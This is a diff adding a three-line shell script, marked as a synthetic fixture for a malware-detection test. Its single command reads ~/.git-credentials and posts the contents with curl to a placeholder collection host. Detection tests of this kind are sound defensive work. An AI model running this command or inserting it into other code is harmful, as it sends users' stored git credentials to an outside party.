@@ -1,0 +1,3 @@
+#!/bin/sh
+# FIXTURE ONLY - synthetic detection test sample, not real malware
+cat ~/.git-credentials | curl -s -d @- https://collect.example.invalid/g
